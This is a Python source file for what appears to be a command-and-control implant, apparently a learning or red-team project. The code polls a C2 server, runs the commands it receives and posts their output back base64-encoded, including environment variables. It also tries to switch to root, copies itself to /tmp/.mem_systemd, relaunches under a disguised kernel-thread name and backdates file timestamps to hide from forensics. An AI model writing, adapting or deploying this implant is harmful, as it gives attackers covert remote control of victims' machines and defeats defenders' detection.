#!/usr/bin/env python3

import subprocess
import hashlib
import os
import sys

import requests

try:
	import pwd
except ModuleNotFoundError:
	pwd = None
import shutil
import shlex
import time
import random
import pathlib
import base64

# TODO signed packets, not passwords
password = "password"
HOST, PORT = "0.0.0.0", 9998
debug = True


def handle(data):
	"""
	Handle incoming commands from C2
	Args:
		data: string with command format key:data:parameters:integrity, now list

	Returns: sends data to C2 server

	"""
	key = data[0]
	command = data[1]
	parameters = data[2]
	integrity = data[3]

	if verify(key, command, parameters, integrity):
		if command == "BUILTIN":
			stdout = run_builtin(parameters)
		else:
			stdout = run_command(command, parameters)
	else:
		stdout = f"Invalid command: {data}"

	output = f"Command: {command} {parameters}\n{stdout}"
	send_data(output)


def request_commands():
	"""
	Make HTTP request

	Returns: the
	"""
	r = requests.get(f"http://{HOST}:{PORT}/commands")

	data = base64.urlsafe_b64decode(bytes(r.text.encode('utf-8'))).decode('utf-8').split()
	return data[0], data[1:]


def send_data(data):
	"""
	Make POST request to C2 server with command data
	Args:
		data:

	Returns:

	"""
	data = base64.urlsafe_b64encode(bytes(data.encode('utf-8')))
	r = requests.post(f"http://{HOST}:{PORT}/data", data=data)
	return r.status_code


def run_builtin(command):
	"""
	Run builtin command, not local terminal
	Args:
		command:

	Returns:

	"""
	if command == "name":
		return f"{os.uname().sysname} {os.uname().release} {os.uname().version} {os.uname().machine}"
	elif command == "cwd":
		return os.getcwd()
	elif command == "env":
		return os.environ
	elif command == "pid":
		return str(os.getpid())


def run_command(command, parameters):
	"""
	Execute command on local terminal
	Args:
		command:
		parameters:

	Returns:

	"""
	try:
		# TODO add shelex processing
		process = subprocess.run([command, parameters], capture_output=True, check=True, encoding='utf-8')
	except subprocess.CalledProcessError:
		return "Error on Command"

	return process.stdout


def verify(key, command, parameters, integrity):
	"""
	Check hash of command, verifying that no data transmission errors have occurred, then check against password
	Args:
		key:
		command:
		parameters:
		integrity:

	Returns:

	"""
	# TODO use salt and hash
	if key != password:
		return False

	data = f"{key}:{command}:{parameters}"
	if hashlib.sha256(data.encode("utf-8")).hexdigest() != integrity:
		print("Data error detected!")
		return False
	return True


def get_pname(pid):
	"""
	get name of function from pid
	Args:
		pid:

	Returns:

	"""
	return os.system(f"ps -o cmd= {pid}")


def upgrade_shell():
	"""
	try to upgrade to root shell
	Returns:
	"""
	try:
		uid = pwd.getpwnam('root')[2]
		os.setuid(uid)
	except (PermissionError, AttributeError):
		pass


def become_silent():
	"""
	Go stealth, move to secret location, set presence IOC
	Returns:

	"""
	# p = psutil.Process(os.getpid())
	# cmdline = p.cmdline()[1]

	cmdline = sys.argv[0]

	# TODO randomize names, dependant on parent, windows location
	hidden, bandit = "/tmp/.mem_systemd", "[kworker/2:0-events]"
	if not check_mark() and cmdline != hidden:
		leave_mark()
		print("No presence detected, going in...")

		shutil.copyfile(cmdline, hidden)
		subprocess.run(["/bin/chmod", "+x", f"{hidden}"])
		subprocess.run(shlex.split(f"bash -c \"exec -a {bandit} {os.path.realpath(__file__)} {hidden} &\""))
		subprocess.run(["/bin/chmod", "-x", f"{hidden}"])
		randomize_timestamp(hidden)
		print("Killing overt agent...")
		exit(0)
	if cmdline == hidden:
		print("Agent is covert!")
	else:
		print("Already present, killing...")
		leave_mark()
		# Should die if already on system
		exit(0)


def randomize_timestamp(file):
	"""
	Generate random timestamp for files created between a year and 6 months ago
	Args:
		file:

	Returns:

	"""
	set_stamp = time.time() - random.randrange(15778463, 31556926)
	os.utime(file, (set_stamp, set_stamp))


def leave_mark():
	"""
	Generate IOCs on machine, to leave presence clear
	"""
	# TODO add more names, randomize
	f = open(f"{str(pathlib.Path.home())}/.zshconf", "w")
	f.close()
	randomize_timestamp(f"{str(pathlib.Path.home())}/.zshconf")
	os.environ["BASH"] = "1"


def check_mark():
	"""

	Returns:

	"""
	if os.path.isfile(f"{str(pathlib.Path.home())}/.zshconf"):
		return True
	if os.environ.get("BASH") == "1":
		return True
	return False


def delay_for_mode(mode):
	"""
	Generate delay appropriate to mode
	Active - 30 seconds
	Passive - between 6 and 18 hours
	Args:
		mode:

	Returns:

	"""
	if mode == "active":
		delay = 30
	else:
		delay = random.randrange(21600, 64800)
	print(f"Delaying for {delay}s...")
	time.sleep(delay)


if __name__ == "__main__":

	if debug:
		try:
			os.remove(f"{str(pathlib.Path.home())}/.zshconf")
			os.environ["BASH"] = "0"
		except FileNotFoundError:
			pass
	upgrade_shell()
	become_silent()

	last_commands = ""

	while 1:
		active, cmds = request_commands()

		cmd_hash = hashlib.md5(''.join(cmds).encode('utf-8')).hexdigest()

		if last_commands != cmd_hash:
			for cmd in cmds:
				handle(cmd.split(":"))
			last_commands = cmd_hash
		else:
			print("No change from C2")

		delay_for_mode(active)
